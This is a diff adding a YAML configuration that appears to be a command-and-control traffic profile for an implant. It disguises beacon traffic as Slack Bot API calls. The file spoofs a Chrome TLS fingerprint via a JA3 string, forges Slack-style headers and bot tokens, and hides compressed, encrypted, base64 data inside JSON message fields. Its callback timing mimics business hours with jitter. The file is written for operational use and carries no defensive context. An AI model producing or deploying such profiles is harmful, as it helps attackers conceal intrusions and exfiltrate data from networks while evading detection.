@@ -1,0 +1,121 @@
+name: slack-webhook
+description: >
+  Impersonates Slack API webhook traffic. TLS fingerprint targets Chrome 120+,
+  HTTP transactions mimic Slack Bot API calls, timing follows business-hours
+  patterns with Gaussian jitter.
+
+tls:
+  cipher_suites:
+    - TLS_AES_128_GCM_SHA256
+    - TLS_AES_256_GCM_SHA384
+    - TLS_CHACHA20_POLY1305_SHA256
+    - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
+    - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+    - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
+    - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+    - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256
+    - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
+  extensions:
+    - server_name
+    - extended_master_secret
+    - renegotiation_info
+    - supported_groups
+    - ec_point_formats
+    - session_ticket
+    - application_layer_protocol_negotiation
+    - status_request
+    - signature_algorithms
+    - signed_certificate_timestamp
+    - key_share
+    - psk_key_exchange_modes
+    - supported_versions
+    - compress_certificate
+    - padding
+  curves:
+    - x25519
+    - secp256r1
+    - secp384r1
+  alpn:
+    - h2
+    - http/1.1
+  target_ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0"
+
+http:
+  uri_rotation: random
+  request:
+    method: POST
+    uri_patterns:
+      - /api/chat.postMessage
+      - /api/conversations.history
+      - /api/conversations.info
+      - /api/conversations.list
+      - /api/users.info
+      - /api/auth.test
+    headers:
+      - name: Host
+        value: "{{host}}"
+      - name: User-Agent
+        value: "Slackbot 1.0 (+https://api.slack.com/robots)"
+      - name: Authorization
+        value: "Bearer xoxb-{{random_hex(8)}}-{{random_hex(12)}}-{{random_hex(24)}}"
+      - name: Content-Type
+        value: application/json; charset=utf-8
+      - name: Accept
+        value: application/json
+      - name: Accept-Encoding
+        value: gzip, deflate, br
+      - name: Accept-Language
+        value: en-US,en;q=0.9
+      - name: Connection
+        value: keep-alive
+      - name: X-Slack-Request-Timestamp
+        value: "{{timestamp}}"
+    body_template: '{"channel":"C{{random_hex(9)}}","text":"{{data}}","as_user":true}'
+    data_embed_points:
+      - location: json_field
+        field_name: text
+        encoding: base64
+  response:
+    method: POST
+    status_code: 200
+    uri_patterns: []
+    headers:
+      - name: Content-Type
+        value: application/json; charset=utf-8
+      - name: X-Slack-Req-Id
+        value: "{{random_hex(16)}}"
+      - name: X-Ratelimit-Limit
+        value: "50"
+      - name: X-Ratelimit-Remaining
+        value: "49"
+      - name: Strict-Transport-Security
+        value: max-age=31536000; includeSubDomains; preload
+      - name: Cache-Control
+        value: no-cache, no-store, must-revalidate
+    body_template: '{"ok":true,"channel":"C{{random_hex(9)}}","message":{"text":"{{data}}","type":"message","subtype":"bot_message","ts":"{{timestamp}}.000000"}}'
+    error_rate_percent: 2.0
+    data_embed_points:
+      - location: json_field
+        field_name: message.text
+        encoding: base64
+
+timing:
+  callback_interval: 30
+  jitter_distribution: gaussian
+  jitter_percent: 25.0
+  working_hours:
+    start_hour: 8
+    end_hour: 18
+    days:
+      - mon
+      - tue
+      - wed
+      - thu
+      - fri
+    off_hours_multiplier: 4.0
+  initial_delay: 120
+
+transform:
+  compress: lz4
+  encrypt: chacha20-poly1305
+  encode: base64
